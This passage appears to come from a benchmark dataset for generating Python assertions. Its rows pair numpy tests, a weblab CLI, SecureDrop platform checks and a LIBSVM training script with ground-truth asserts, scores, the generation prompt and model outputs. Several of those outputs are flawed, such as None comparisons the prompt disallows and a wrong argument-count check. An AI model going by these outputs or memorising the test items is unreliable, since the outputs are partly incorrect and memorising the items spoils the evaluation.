65            # This should exeercise <typoe>_copyswap
66            x[::2].fill( t(2) )
67
68
69    def test_copyswap_misc( self ):
70
71        x = np.array( [ u'a', u'b', u'c' ] )
72        x[::2].fill( u'd' )
73
74    def test_copyswapn( self ):
75
76        # bool lacks arange support.
77        for k,t in enumerate( alltypes[1:] ):
78
79            x = np.arange( 10, dtype=t )
80            y = x.byteswap()
81            z = y.byteswap()
82
83
84    def test_copyswapn_misc( self ):
85        x = np.array( [ u'a', u'b', u'c' ] )
86        y = x.byteswap()
87        z = y.byteswap()
88
89
90    def test_compare( self ):
91
92        for k,t in enumerate( alltypes[1:] ):
93
94            try:
95                a = np.arange( 10, dtype=t )
96                keys = a[::2]
97                b = a.searchsorted( keys )
98                c = a.copy()
99                np.insert( c, b, b.astype( t ) )
100                c.sort()
101
102            except TypeError, e:
103                print ""Trouble with type %d:"" % k, e
104
105    def test_compare_bool( self ):
106        # bool can't handle numpy.arange(), so has to be coded separately.
107        a = np.array( [False, True], dtype=np.bool_ )
108        keys = a
109        b = a.searchsorted( keys )
110        c = a.copy()
111        np.insert( c, b, keys )
112        c.sort()
113
114    def test_dot( self ):
115
116        # Do something to test dot on bool...
117
118        for k,t in enumerate( alltypes[1:] ):
119            a = np.arange( 3, dtype=t ) + 1
120                   ""Problem with dot product with array of type %s"" % k
121
122    def test_clip( self ):
123
124        for k,t in enumerate( alltypes[1:] ):
125            a = np.arange( 5, dtype=t )
126            b = a.clip( 2, 3 )
127            x = np.array( [2,2,2,3,3], dtype=t )
128
129    def test_clip_bool( self ):
130        a = np.array( [False, True], np.bool )
131
132    def test_array_casting( self ):
133
134        for k,t in enumerate( alltypes ):
135
136            a = np.array( [ t(1) ] )
137
138            for k2, t2 in enumerate( alltypes ):
139
140                b = a.astype( t2 )
141
142                if k2 < len(types):
143                           ""Busted array type casting: k=%d k2=%d"" % (k,k2)
144
145                else:
146                    # Casting to datetime64 yields a 1/1/1970+... result,
147                    # which isn't so hot for checking against ""1"".  So, in
148                    # these cases, just cast back to the starting time, and
149                    # make sure we got back what we started with.
150                    c = b.astype( t )
151
152    def test_take( self ):
153        # Test all types, but skipp np.bool_ for now, as it lacks a fill
154        # function.  Grrr.
155        for k,t in enumerate( alltypes[1:] ):
156            a = np.arange( 10, dtype=t )
157            idx = np.arange(5) * 2
158            c = np.take( a, idx )
159
160    def test_putmask( self ):
161
162        for k,t in enumerate( alltypes[1:] ):
163            a = np.arange( 5, dtype=t )
164            mask = np.zeros( 5, dtype=np.bool )
165            mask[::2] = True
166            np.putmask( a, mask, t(8) )
167
168            x = np.array( [8,1,8,3,8], dtype=t )
169
170
171    def test_fillwithscalar( self ):
172
173        a = np.empty( 2, dtype=np.datetime64 )
174        a.fill( np.datetime64( 3 ) )
175        x = np.zeros( 2, dtype=np.datetime64 ) + 3
176
177if __name__ == ""__main__"":
178    run_module_suite()
179",6760,"[[23, 'x', '==', 4, 'array x should always be of length 4'],
 [28, 'a', '==', 3, 'array a should always be of length 3'],
 [34, 'k', '>=', 0, 'indexes should not be a negative integer'],
 [34, 't', '!=', """", 'Type t must not be an empty string'],
 [38, 'a', '==', 5, 'array a should always be of length 5'],
 [42, 'k', '>=', 0, 'indexes should not be a negative integer'],
 [42, 't', '!=', """", 'Type t must not be an empty string'],
 [44, 'a', '==', 1, 'array a should always be of length 1'],
 [49, 'a', '==', 1, 'array a should always be of length 1'],
 [51, 'a', '==', 1, 'array a should always be of length 1'],
 [62, 'k', '>=', 0, 'indexes should not be a negative integer'],
 [62, 't', '!=', """", 'Type t must not be an empty string'],
 [64, 'x', '==', 10, 'array x should always be of length 10'],
 [71, 'x', '==', 3, 'array x should always be of length 3'],
 [77, 'k', '>=', 0, 'indexes should not be a negative integer'],
 [77, 't', '!=', """", 'Type t must not be an empty string'],
 [79, 'x', '==', 10, 'array x should always be of length 10'],
 [84, 'x', '==', 3, 'array x should always be of length 3'],
 [92, 'k', '>=', 0, 'indexes should not be a negative integer'],
 [92, 't', '!=', """", 'Type t must not be an empty string'],
 [95, 'a', '==', 10, 'array a should always be of length 10'],
 [97, 'b', '==', 5, 'array b should always be of length 5'],
 [106, 'a', '==', 2, 'array a should always be of length 2'],
 [108, 'keys', '==', 2, 'array keys should always be of length 2'],
 [109, 'b', '==', 2, 'array b should always be of length 2'],
 [114, 'k', '>=', 0, 'indexes should not be a negative integer'],
 [114, 't', '!=', """", 'Type t must not be an empty string'],
 [127, 'k', '>=', 0, 'indexes should not be a negative integer'],
 [127, 't', '!=', """", 'Type t must not be an empty string'],
 [134, 'k', '>=', 0, 'indexes should not be a negative integer'],
 [134, 't', '!=', """", 'Type t must not be an empty string'],
 [136, 'a', '==', 1, 'array a should always be of length 1'],
 [155, 'k', '>=', 0, 'indexes should not be a negative integer'],
 [155, 't', '!=', """", 'Type t must not be an empty string'],
 [156, 'a', '==', 10, 'array a should always be of length 10'],
 [157, 'idx', '==', 5, 'index array idx should always be of length 5'],
 [162, 'k', '>=', 0, 'indexes should not be a negative integer'],
 [162, 't', '!=', """", 'Type t must not be an empty string'],
 [163, 'a', '==', 5, 'array a should always be of length 5'],
 [164, 'mask', '==', 5, 'mask array should always be of length 5'],
 [165, 'mask[::2]', '==', 3, 'mask[::2] array should always be of length 3']]"
zstars/weblabdeusto,"#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Copyright (C) 2012 onwards University of Deusto
# All rights reserved.
#
# This software is licensed as described in the file COPYING, which
# you should have received as part of this distribution.
#
# This software consists of contributions made by many individuals,
# listed below:
#
# Author: Pablo Orduña <pablo@ordunya.com>
#         Luis Rodriguez <luis.rodriguez@opendeusto.es>
# 

import sys

from weblab import __version__ as weblab_version

from weblab.admin.script.creation import weblab_create, Creation
assert Creation != None # Avoid pyflakes warning, wcloud still uses ""from weblab.admin.script import Creation""
from weblab.admin.script.run import weblab_start, weblab_stop
from weblab.admin.script.monitor import weblab_monitor
from weblab.admin.script.admin import weblab_admin
from weblab.admin.script.upgrade import weblab_upgrade

# 
# TODO
#  - --virtual-machine
#


# Error codes:
#
# 0: SUCCESS (NO ERROR)
# 2: WRONG ARGS


SORTED_COMMANDS = []
SORTED_COMMANDS.append(('create',     'Create a new weblab instance')), 
SORTED_COMMANDS.append(('start',      'Start an existing weblab instance')), 
SORTED_COMMANDS.append(('stop',       'Stop an existing weblab instance')),
SORTED_COMMANDS.append(('admin',      'Adminstrate a weblab instance')),
SORTED_COMMANDS.append(('monitor',    'Monitor the current use of a weblab instance')),
SORTED_COMMANDS.append(('upgrade',    'Upgrade the current setting')), 

COMMANDS = dict(SORTED_COMMANDS)
HIDDEN_COMMANDS = ('-version', '--version', '-V')

def weblab():
    if len(sys.argv) == 2 and sys.argv[1] in HIDDEN_COMMANDS:
        if sys.argv[1] in ('--version', '-version', '-V'):
            print weblab_version
            sys.exit(2)
        else:
            print >> sys.stderr, ""Command %s not implemented"" % sys.argv[1]
            sys.exit(0)
    if len(sys.argv) in (1, 2) or sys.argv[1] not in COMMANDS:
        command_list = """"
        max_size = max((len(command) for command in COMMANDS))
        for command, help_text in SORTED_COMMANDS:
            filled_command = command + ' ' * (max_size - len(command))
            command_list += ""\t%s\t%s\n"" % (filled_command, help_text)
        print >> sys.stderr, ""Usage: %s option DIR [option arguments]\n\n%s\n"" % (sys.argv[0], command_list)
        sys.exit(2)
    main_command = sys.argv[1]
    if main_command == 'create':
        weblab_create(sys.argv[2])
        return

    if main_command == 'start':
        weblab_start(sys.argv[2])
    elif main_command == 'stop':
        weblab_stop(sys.argv[2])
    elif main_command == 'monitor':
        weblab_monitor(sys.argv[2])
    elif main_command == 'admin':
        weblab_admin(sys.argv[2])
    elif main_command == 'upgrade':
        weblab_upgrade(sys.argv[2])
    elif main_command == '--version':
        print weblab_version
    else:
        print >>sys.stderr, ""Command %s not yet implemented"" % sys.argv[1]
        exit(2)


","
1#!/usr/bin/python
2# -*- coding: utf-8 -*-
3#
4# Copyright (C) 2012 onwards University of Deusto
5# All rights reserved.
6#
7# This software is licensed as described in the file COPYING, which
8# you should have received as part of this distribution.
9#
10# This software consists of contributions made by many individuals,
11# listed below:
12#
13# Author: Pablo Orduña <pablo@ordunya.com>
14#         Luis Rodriguez <luis.rodriguez@opendeusto.es>
15# 
16
17import sys
18
19from weblab import __version__ as weblab_version
20
21from weblab.admin.script.creation import weblab_create, Creation
22from weblab.admin.script.run import weblab_start, weblab_stop
23from weblab.admin.script.monitor import weblab_monitor
24from weblab.admin.script.admin import weblab_admin
25from weblab.admin.script.upgrade import weblab_upgrade
26
27# 
28# TODO
29#  - --virtual-machine
30#
31
32
33# Error codes:
34#
35# 0: SUCCESS (NO ERROR)
36# 2: WRONG ARGS
37
38
39SORTED_COMMANDS = []
40SORTED_COMMANDS.append(('create',     'Create a new weblab instance')), 
41SORTED_COMMANDS.append(('start',      'Start an existing weblab instance')), 
42SORTED_COMMANDS.append(('stop',       'Stop an existing weblab instance')),
43SORTED_COMMANDS.append(('admin',      'Adminstrate a weblab instance')),
44SORTED_COMMANDS.append(('monitor',    'Monitor the current use of a weblab instance')),
45SORTED_COMMANDS.append(('upgrade',    'Upgrade the current setting')), 
46
47COMMANDS = dict(SORTED_COMMANDS)
48HIDDEN_COMMANDS = ('-version', '--version', '-V')
49
50def weblab():
51    if len(sys.argv) == 2 and sys.argv[1] in HIDDEN_COMMANDS:
52        if sys.argv[1] in ('--version', '-version', '-V'):
53            print weblab_version
54            sys.exit(2)
55        else:
56            print >> sys.stderr, ""Command %s not implemented"" % sys.argv[1]
57            sys.exit(0)
58    if len(sys.argv) in (1, 2) or sys.argv[1] not in COMMANDS:
59        command_list = """"
60        max_size = max((len(command) for command in COMMANDS))
61        for command, help_text in SORTED_COMMANDS:
62            filled_command = command + ' ' * (max_size - len(command))
63            command_list += ""\t%s\t%s\n"" % (filled_command, help_text)
64        print >> sys.stderr, ""Usage: %s option DIR [option arguments]\n\n%s\n"" % (sys.argv[0], command_list)
65        sys.exit(2)
66    main_command = sys.argv[1]
67    if main_command == 'create':
68        weblab_create(sys.argv[2])
69        return
70
71    if main_command == 'start':
72        weblab_start(sys.argv[2])
73    elif main_command == 'stop':
74        weblab_stop(sys.argv[2])
75    elif main_command == 'monitor':
76        weblab_monitor(sys.argv[2])
77    elif main_command == 'admin':
78        weblab_admin(sys.argv[2])
79    elif main_command == 'upgrade':
80        weblab_upgrade(sys.argv[2])
81    elif main_command == '--version':
82        print weblab_version
83    else:
84        print >>sys.stderr, ""Command %s not yet implemented"" % sys.argv[1]
85        exit(2)
86
87
88","[['Creation', '!=', 'None']]",1,1,1.0,0.0003369272237196,"['SORTED_COMMANDS', 'COMMANDS', 'HIDDEN_COMMANDS', 'command_list', 'max_size', 'filled_command', 'main_command']",7,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['SORTED_COMMANDS', 'COMMANDS', 'HIDDEN_COMMANDS', 'command_list', 'max_size', 'filled_command', 'main_command']
*Code:

1#!/usr/bin/python
2# -*- coding: utf-8 -*-
3#
4# Copyright (C) 2012 onwards University of Deusto
5# All rights reserved.
6#
7# This software is licensed as described in the file COPYING, which
8# you should have received as part of this distribution.
9#
10# This software consists of contributions made by many individuals,
11# listed below:
12#
13# Author: Pablo Orduña <pablo@ordunya.com>
14#         Luis Rodriguez <luis.rodriguez@opendeusto.es>
15# 
16
17import sys
18
19from weblab import __version__ as weblab_version
20
21from weblab.admin.script.creation import weblab_create, Creation
22from weblab.admin.script.run import weblab_start, weblab_stop
23from weblab.admin.script.monitor import weblab_monitor
24from weblab.admin.script.admin import weblab_admin
25from weblab.admin.script.upgrade import weblab_upgrade
26
27# 
28# TODO
29#  - --virtual-machine
30#
31
32
33# Error codes:
34#
35# 0: SUCCESS (NO ERROR)
36# 2: WRONG ARGS
37
38
39SORTED_COMMANDS = []
40SORTED_COMMANDS.append(('create',     'Create a new weblab instance')), 
41SORTED_COMMANDS.append(('start',      'Start an existing weblab instance')), 
42SORTED_COMMANDS.append(('stop',       'Stop an existing weblab instance')),
43SORTED_COMMANDS.append(('admin',      'Adminstrate a weblab instance')),
44SORTED_COMMANDS.append(('monitor',    'Monitor the current use of a weblab instance')),
45SORTED_COMMANDS.append(('upgrade',    'Upgrade the current setting')), 
46
47COMMANDS = dict(SORTED_COMMANDS)
48HIDDEN_COMMANDS = ('-version', '--version', '-V')
49
50def weblab():
51    if len(sys.argv) == 2 and sys.argv[1] in HIDDEN_COMMANDS:
52        if sys.argv[1] in ('--version', '-version', '-V'):
53            print weblab_version
54            sys.exit(2)
55        else:
56            print >> sys.stderr, ""Command %s not implemented"" % sys.argv[1]
57            sys.exit(0)
58    if len(sys.argv) in (1, 2) or sys.argv[1] not in COMMANDS:
59        command_list = """"
60        max_size = max((len(command) for command in COMMANDS))
61        for command, help_text in SORTED_COMMANDS:
62            filled_command = command + ' ' * (max_size - len(command))
63            command_list += ""\t%s\t%s\n"" % (filled_command, help_text)
64        print >> sys.stderr, ""Usage: %s option DIR [option arguments]\n\n%s\n"" % (sys.argv[0], command_list)
65        sys.exit(2)
66    main_command = sys.argv[1]
67    if main_command == 'create':
68        weblab_create(sys.argv[2])
69        return
70
71    if main_command == 'start':
72        weblab_start(sys.argv[2])
73    elif main_command == 'stop':
74        weblab_stop(sys.argv[2])
75    elif main_command == 'monitor':
76        weblab_monitor(sys.argv[2])
77    elif main_command == 'admin':
78        weblab_admin(sys.argv[2])
79    elif main_command == 'upgrade':
80        weblab_upgrade(sys.argv[2])
81    elif main_command == '--version':
82        print weblab_version
83    else:
84        print >>sys.stderr, ""Command %s not yet implemented"" % sys.argv[1]
85        exit(2)
86
87
88",4517,"[[50, 'sys.argv', '>=', 1, ""The function needs at least one argument (the function name itself) to run""],
[60, 'COMMANDS', '!=', 0, ""There must be at least one command in COMMANDS to find maximum length""],
[66, 'sys.argv', '>=', 2, ""A command is needed as the second argument""]]"
heartsucker/securedrop,"# We expect Ubuntu Xenial
SUPPORTED_CODENAMES = ('xenial')
SUPPORTED_RELEASES = ('16.04')


def test_ansible_version(host):
    """"""
    Check that a supported version of Ansible is being used.

    The project has long used the Ansible 1.x series, ans now
    requires the 2.x series starting with the 0.4 release. Ensure
    installation is not being performed with an outdated ansible version.
    """"""
    localhost = host.get_host(""local://"")
    c = localhost.check_output(""ansible --version"")
    assert c.startswith(""ansible 2."")


def test_platform(host):
    """"""
    SecureDrop requires Ubuntu Ubuntu 16.04 LTS.
    """"""
    assert host.system_info.type == ""linux""
    assert host.system_info.distribution == ""ubuntu""
    assert host.system_info.codename in SUPPORTED_CODENAMES
    assert host.system_info.release in SUPPORTED_RELEASES
","
1# We expect Ubuntu Xenial
2SUPPORTED_CODENAMES = ('xenial')
3SUPPORTED_RELEASES = ('16.04')
4
5
6def test_ansible_version(host):
7    """"""
8    Check that a supported version of Ansible is being used.
9
10    The project has long used the Ansible 1.x series, ans now
11    requires the 2.x series starting with the 0.4 release. Ensure
12    installation is not being performed with an outdated ansible version.
13    """"""
14    localhost = host.get_host(""local://"")
15    c = localhost.check_output(""ansible --version"")
16
17
18def test_platform(host):
19    """"""
20    SecureDrop requires Ubuntu Ubuntu 16.04 LTS.
21    """"""
22","[['c.startswith(""ansible', '2."")'], ['host.system_info.type', '==', '""linux""'], ['host.system_info.distribution', '==', '""ubuntu""']]",5,3,0.6,0.0035587188612099,"['SUPPORTED_CODENAMES', 'SUPPORTED_RELEASES', 'host', 'localhost', 'c']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['SUPPORTED_CODENAMES', 'SUPPORTED_RELEASES', 'host', 'localhost', 'c']
*Code:

1# We expect Ubuntu Xenial
2SUPPORTED_CODENAMES = ('xenial')
3SUPPORTED_RELEASES = ('16.04')
4
5
6def test_ansible_version(host):
7    """"""
8    Check that a supported version of Ansible is being used.
9
10    The project has long used the Ansible 1.x series, ans now
11    requires the 2.x series starting with the 0.4 release. Ensure
12    installation is not being performed with an outdated ansible version.
13    """"""
14    localhost = host.get_host(""local://"")
15    c = localhost.check_output(""ansible --version"")
16
17
18def test_platform(host):
19    """"""
20    SecureDrop requires Ubuntu Ubuntu 16.04 LTS.
21    """"""
22",2077,"[[6, 'host', '!=', None, ""host variable should not be None to retrieve ansible version""], 
[14, 'localhost', '!=', None, ""localhost should not be None for command execution""],
[15, 'c', '!=', None, ""Check_output should not return None""],
[18, 'host', '!=', None, ""host variable should not be None for testing platform""],
[2, 'SUPPORTED_CODENAMES', '!=', None, ""SUPPORTED_CODENAMES should not be None""],
[3, 'SUPPORTED_RELEASES', '!=', None, ""SUPPORTED_RELEASES should not be None""]]"
soarlab/maline,"#!/usr/bin/env python

import sys
import os
from subprocess import *
from distutils.core import setup, Extension, Command
from distutils.command.build import build
from distutils.command.build_ext import build_ext
from distutils.spawn import find_executable

if len(sys.argv) <= 1:
	print('Usage: {0} training_file [testing_file]'.format(sys.argv[0]))
	raise SystemExit

# svm, grid, and gnuplot executable files

is_win32 = (sys.platform == 'win32')
if not is_win32:
	svmscale_exe = find_executable(""svm-scale"")
	svmtrain_exe = find_executable(""svm-train"")
	svmpredict_exe = find_executable(""svm-predict"")
	grid_py = find_executable(""grid.py"")
	gnuplot_exe = ""/usr/bin/gnuplot""
else:
        # example for windows
	svmscale_exe = r""..\windows\svm-scale.exe""
	svmtrain_exe = r""..\windows\svm-train.exe""
	svmpredict_exe = r""..\windows\svm-predict.exe""
	gnuplot_exe = r""c:\tmp\gnuplot\binary\pgnuplot.exe""
	grid_py = r"".\grid.py""

assert os.path.exists(svmscale_exe),""svm-scale executable not found""
assert os.path.exists(svmtrain_exe),""svm-train executable not found""
assert os.path.exists(svmpredict_exe),""svm-predict executable not found""
assert os.path.exists(gnuplot_exe),""gnuplot executable not found""
assert os.path.exists(grid_py),""grid.py not found""

train_pathname = sys.argv[1]
assert os.path.exists(train_pathname),""training file not found""
file_name = os.path.split(train_pathname)[1]
scaled_file = file_name + "".scale""
model_file = file_name + "".model""
range_file = file_name + "".range""

if len(sys.argv) > 2:
	test_pathname = sys.argv[2]
	file_name = os.path.split(test_pathname)[1]
	assert os.path.exists(test_pathname),""testing file not found""
	scaled_test_file = file_name + "".scale""
	predict_test_file = file_name + "".predict""

cmd = '{0} -s ""{1}"" ""{2}"" > ""{3}""'.format(svmscale_exe, range_file, train_pathname, scaled_file)
print('Scaling training data...')
Popen(cmd, shell = True, stdout = PIPE).communicate()	

cmd = '{0} -svmtrain ""{1}"" -gnuplot ""{2}"" ""{3}""'.format(grid_py, svmtrain_exe, gnuplot_exe, scaled_file)
print('Cross validation...')
f = Popen(cmd, shell = True, stdout = PIPE).stdout

line = ''
while True:
	last_line = line
	line = f.readline()
	if not line: break
c,g,rate = map(float,last_line.split())

print('Best c={0}, g={1} CV rate={2}'.format(c,g,rate))

cmd = '{0} -c {1} -g {2} ""{3}"" ""{4}""'.format(svmtrain_exe,c,g,scaled_file,model_file)
print('Training...')
Popen(cmd, shell = True, stdout = PIPE).communicate()

print('Output model: {0}'.format(model_file))
if len(sys.argv) > 2:
	cmd = '{0} -r ""{1}"" ""{2}"" > ""{3}""'.format(svmscale_exe, range_file, test_pathname, scaled_test_file)
	print('Scaling testing data...')
	Popen(cmd, shell = True, stdout = PIPE).communicate()	

	cmd = '{0} ""{1}"" ""{2}"" ""{3}""'.format(svmpredict_exe, scaled_test_file, model_file, predict_test_file)
	print('Testing...')
	Popen(cmd, shell = True).communicate()	

	print('Output prediction: {0}'.format(predict_test_file))
","
1#!/usr/bin/env python
2
3import sys
4import os
5from subprocess import *
6from distutils.core import setup, Extension, Command
7from distutils.command.build import build
8from distutils.command.build_ext import build_ext
9from distutils.spawn import find_executable
10
11if len(sys.argv) <= 1:
12	print('Usage: {0} training_file [testing_file]'.format(sys.argv[0]))
13	raise SystemExit
14
15# svm, grid, and gnuplot executable files
16
17is_win32 = (sys.platform == 'win32')
18if not is_win32:
19	svmscale_exe = find_executable(""svm-scale"")
20	svmtrain_exe = find_executable(""svm-train"")
21	svmpredict_exe = find_executable(""svm-predict"")
22	grid_py = find_executable(""grid.py"")
23	gnuplot_exe = ""/usr/bin/gnuplot""
24else:
25        # example for windows
26	svmscale_exe = r""..\windows\svm-scale.exe""
27	svmtrain_exe = r""..\windows\svm-train.exe""
28	svmpredict_exe = r""..\windows\svm-predict.exe""
29	gnuplot_exe = r""c:\tmp\gnuplot\binary\pgnuplot.exe""
30	grid_py = r"".\grid.py""
31
32
33train_pathname = sys.argv[1]
34file_name = os.path.split(train_pathname)[1]
35scaled_file = file_name + "".scale""
36model_file = file_name + "".model""
37range_file = file_name + "".range""
38
39if len(sys.argv) > 2:
40	test_pathname = sys.argv[2]
41	file_name = os.path.split(test_pathname)[1]
42	scaled_test_file = file_name + "".scale""
43	predict_test_file = file_name + "".predict""
44
45cmd = '{0} -s ""{1}"" ""{2}"" > ""{3}""'.format(svmscale_exe, range_file, train_pathname, scaled_file)
46print('Scaling training data...')
47Popen(cmd, shell = True, stdout = PIPE).communicate()	
48
49cmd = '{0} -svmtrain ""{1}"" -gnuplot ""{2}"" ""{3}""'.format(grid_py, svmtrain_exe, gnuplot_exe, scaled_file)
50print('Cross validation...')
51f = Popen(cmd, shell = True, stdout = PIPE).stdout
52
53line = ''
54while True:
55	last_line = line
56	line = f.readline()
57	if not line: break
58c,g,rate = map(float,last_line.split())
59
60print('Best c={0}, g={1} CV rate={2}'.format(c,g,rate))
61
62cmd = '{0} -c {1} -g {2} ""{3}"" ""{4}""'.format(svmtrain_exe,c,g,scaled_file,model_file)
63print('Training...')
64Popen(cmd, shell = True, stdout = PIPE).communicate()
65
66print('Output model: {0}'.format(model_file))
67if len(sys.argv) > 2:
68	cmd = '{0} -r ""{1}"" ""{2}"" > ""{3}""'.format(svmscale_exe, range_file, test_pathname, scaled_test_file)
69	print('Scaling testing data...')
70	Popen(cmd, shell = True, stdout = PIPE).communicate()	
71
72	cmd = '{0} ""{1}"" ""{2}"" ""{3}""'.format(svmpredict_exe, scaled_test_file, model_file, predict_test_file)
73	print('Testing...')
74	Popen(cmd, shell = True).communicate()	
75
76	print('Output prediction: {0}'.format(predict_test_file))
77","[['os.path.exists(svmscale_exe)', '==', 'True'], ['os.path.exists(svmtrain_exe)', '==', 'True'], ['os.path.exists(svmpredict_exe)', '==', 'True'], ['os.path.exists(gnuplot_exe)', '==', 'True'], ['os.path.exists(grid_py)', '==', 'True'], ['os.path.exists(train_pathname)', '==', 'True'], ['os.path.exists(test_pathname)', '==', 'True']]",7,7,1.0,0.0023769100169779,"['is_win32', 'svmscale_exe', 'svmtrain_exe', 'svmpredict_exe', 'grid_py', 'gnuplot_exe', 'train_pathname', 'file_name', 'scaled_file', 'model_file', 'range_file', 'test_pathname', 'scaled_test_file', 'predict_test_file', 'cmd', 'Popen(cmd', 'shell', 'f', 'line', 'last_line', 'c', 'g', 'rate']",23,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['is_win32', 'svmscale_exe', 'svmtrain_exe', 'svmpredict_exe', 'grid_py', 'gnuplot_exe', 'train_pathname', 'file_name', 'scaled_file', 'model_file', 'range_file', 'test_pathname', 'scaled_test_file', 'predict_test_file', 'cmd', 'Popen(cmd', 'shell', 'f', 'line', 'last_line', 'c', 'g', 'rate']
*Code:

1#!/usr/bin/env python
2
3import sys
4import os
5from subprocess import *
6from distutils.core import setup, Extension, Command
7from distutils.command.build import build
8from distutils.command.build_ext import build_ext
9from distutils.spawn import find_executable
10
11if len(sys.argv) <= 1:
12	print('Usage: {0} training_file [testing_file]'.format(sys.argv[0]))
13	raise SystemExit
14
15# svm, grid, and gnuplot executable files
16
17is_win32 = (sys.platform == 'win32')
18if not is_win32:
19	svmscale_exe = find_executable(""svm-scale"")
20	svmtrain_exe = find_executable(""svm-train"")
21	svmpredict_exe = find_executable(""svm-predict"")
22	grid_py = find_executable(""grid.py"")
23	gnuplot_exe = ""/usr/bin/gnuplot""
24else:
25        # example for windows
26	svmscale_exe = r""..\windows\svm-scale.exe""
27	svmtrain_exe = r""..\windows\svm-train.exe""
28	svmpredict_exe = r""..\windows\svm-predict.exe""
29	gnuplot_exe = r""c:\tmp\gnuplot\binary\pgnuplot.exe""
30	grid_py = r"".\grid.py""
31
32
33train_pathname = sys.argv[1]
34file_name = os.path.split(train_pathname)[1]
35scaled_file = file_name + "".scale""
36model_file = file_name + "".model""
37range_file = file_name + "".range""
38
39if len(sys.argv) > 2:
40	test_pathname = sys.argv[2]
41	file_name = os.path.split(test_pathname)[1]
42	scaled_test_file = file_name + "".scale""
43	predict_test_file = file_name + "".predict""
44
45cmd = '{0} -s ""{1}"" ""{2}"" > ""{3}""'.format(svmscale_exe, range_file, train_pathname, scaled_file)
46print('Scaling training data...')
47Popen(cmd, shell = True, stdout = PIPE).communicate()	
48
49cmd = '{0} -svmtrain ""{1}"" -gnuplot ""{2}"" ""{3}""'.format(grid_py, svmtrain_exe, gnuplot_exe, scaled_file)
50print('Cross validation...')
51f = Popen(cmd, shell = True, stdout = PIPE).stdout
52
53line = ''
54while True:
55	last_line = line
56	line = f.readline()
57	if not line: break
58c,g,rate = map(float,last_line.split())
59
60print('Best c={0}, g={1} CV rate={2}'.format(c,g,rate))
61
62cmd = '{0} -c {1} -g {2} ""{3}"" ""{4}""'.format(svmtrain_exe,c,g,scaled_file,model_file)
63print('Training...')
64Popen(cmd, shell = True, stdout = PIPE).communicate()
65
66print('Output model: {0}'.format(model_file))
67if len(sys.argv) > 2:
68	cmd = '{0} -r ""{1}"" ""{2}"" > ""{3}""'.format(svmscale_exe, range_file, test_pathname, scaled_test_file)
69	print('Scaling testing data...')
70	Popen(cmd, shell = True, stdout = PIPE).communicate()	
71
72	cmd = '{0} ""{1}"" ""{2}"" ""{3}""'.format(svmpredict_exe, scaled_test_file, model_file, predict_test_file)
73	print('Testing...')
74	Popen(cmd, shell = True).communicate()	
75
76	print('Output prediction: {0}'.format(predict_test_file))
77",4309,"[11, 'sys.argv', >=, 2, ""the script requires at least one argument for the training_file""],
[39, 'sys.argv', >=, 3, ""a testing_file argument is optional""],
[18, 'is_win32', !=, None, ""is_win32 must be defined before its value is checked""],
[19, 'svmscale_exe', !=, None, ""ensure svmscale_exe is correctly established""],
[20, 'svmtrain_exe', !=, None, ""ensure svmtrain_exe is correctly established""],
[21, 'svmpredict_exe', !=, None, ""ensure svmpredict_exe is correctly established""],
[22, 'grid_py', !=, None, ""ensure grid_py is correctly established""],
[33, 'train_pathname', !=, None, ""train_pathname must be correctly defined""],
[40, 'test_pathname', !=, None, ""test_pathname need to be defined if sys.argv has more than 2 arguments""],
[57, 'line', !=, None, ""ensure readline function is returning valid line""],
[58, 'c', !=, None, ""ensure float conversion is successful for c""],
[58, 'g', !=, None, ""ensure float conversion is successful for g""],
[58, 'rate', !=, None, ""ensure float conversion is successful for rate""]"
mpharrigan/mixtape,"import sys

import numpy as np
import scipy.linalg
from msmbuilder.decomposition._speigh import project
